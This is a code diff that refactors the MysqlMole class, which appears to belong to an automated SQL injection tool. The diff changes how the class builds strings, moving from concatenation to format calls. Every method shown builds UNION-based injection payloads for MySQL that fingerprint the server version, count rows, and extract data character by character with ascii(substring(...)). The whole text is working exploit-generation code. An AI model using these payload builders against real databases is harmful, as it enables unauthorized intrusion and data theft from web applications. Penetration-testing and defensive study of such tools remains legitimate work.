@@ -108,13 +108,12 @@ class MysqlMole(DbmsMole):
 
     @classmethod
     def field_finger_query(cls, columns, finger, injectable_field):
-        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
         if finger.is_string_query:
             query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
         else:
             query_list[injectable_field] = MysqlMole.integer_field_finger
-        query += ",".join(query_list)
+        query = " and 1 = 0 UNION ALL SELECT {fields}".format(fields=",".join(query_list))
         return query
 
     @classmethod
@@ -129,28 +128,25 @@ class MysqlMole(DbmsMole):
         return ' and 0 < (select length(@@version)) '
 
     def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
-        query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        query_list[injectable_field] = ("CONCAT(" + MysqlMole.out_delimiter + ",COUNT(*)," + MysqlMole.out_delimiter + ")")
-        query += ','.join(query_list)
+        query_list[injectable_field] = ("CONCAT({delim},COUNT(*),{delim})".format(delim=MysqlMole.out_delimiter))
+        query = " and 1=0 UNION ALL SELECT " + ','.join(query_list)
         if len(table_name) > 0:
-            query += " from " + table_name
-            query += " where " + self.parse_condition(where)
+            query += " from {table} where {cond}".format(table=table_name, cond=self.parse_condition(where))
         return query
 
     def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
-        query_list[injectable_field] = ("CONCAT(" +
-                                            MysqlMole.out_delimiter +
-                                            "," + self._concat_fields(fields) + "," +
-                                            MysqlMole.out_delimiter +
-                                        ")")
-        query += ','.join(query_list)
+        query_list[injectable_field] = ("CONCAT({delim},{fields},{delim})".format(
+                                        delim=MysqlMole.out_delimiter, 
+                                        fields=self._concat_fields(fields)))
+        query = " and 1=0 UNION ALL SELECT " + ','.join(query_list)
         if len(table_name) > 0:
-            query += " from " + table_name
-            query += " where " + self.parse_condition(where) + \
-                     " limit 1 offset " + str(offset) + " "
+            query += (" from {table} where {cond} limit 1 offset {offset}".format(
+                        table=table_name,
+                        cond=self.parse_condition(where),
+                        offset=str(offset))
+                     )
         return query
 
     def forge_integer_count_query(self, fields, table, injectable_field, where="1=1", offset=0):
@@ -159,12 +155,14 @@ class MysqlMole(DbmsMole):
             where = ' where ' + where
         else:
             where = ' '
-        query = ' and 1=0 union all select '
         query_list = list(self.finger._query)
-        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
-               ',count(*), ' + MysqlMole.integer_out_delimiter + ')')
-        query += ','.join(query_list)
-        query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
+        query_list[injectable_field] = ('CONCAT({delim},COUNT(*),{delim})'.format(delim=MysqlMole.integer_out_delimiter))
+        query = ' and 1=0 union all select {fields} {table} {where} limit 1 offset {offset}'.format(
+                    fields=','.join(query_list),
+                    table=table,
+                    where=self.parse_condition(where),
+                    offset=str(offset)
+                )
         return query
 
     def forge_integer_query(self, index, fields, table, injectable_field, where="1=1", offset=0):
@@ -175,10 +173,14 @@ class MysqlMole(DbmsMole):
             where = ' '
         query = ' and 1=0 union all select '
         query_list = list(self.finger._query)
-        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
-               ',ascii(substring(concat('+self._concat_fields(fields)+'), '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + ')')
+        query_list[injectable_field] = ('concat({delim},ascii(substring(concat('+
+                                            self._concat_fields(fields)+
+                                        '),{index}, 1)),{delim})').format(
+                                            index=str(index),
+                                            delim=MysqlMole.integer_out_delimiter
+                                        )
         query += ','.join(query_list)
-        query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
+        query += table + ' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
 
     def forge_integer_len_query(self, fields, table, injectable_field, where="1=1", offset=0):
@@ -189,8 +191,9 @@ class MysqlMole(DbmsMole):
             where = ' '
         query = ' and 1=0 union all select '
         query_list = list(self.finger._query)
-        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
-               ',length(concat('+self._concat_fields(fields)+')),' + MysqlMole.integer_out_delimiter+ ')')
+        query_list[injectable_field] = ('concat({delim},length(concat('+
+                                            self._concat_fields(fields)+
+                                        ')),{delim})').format(delim=MysqlMole.integer_out_delimiter)
         query += ','.join(query_list)
         query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
         return query
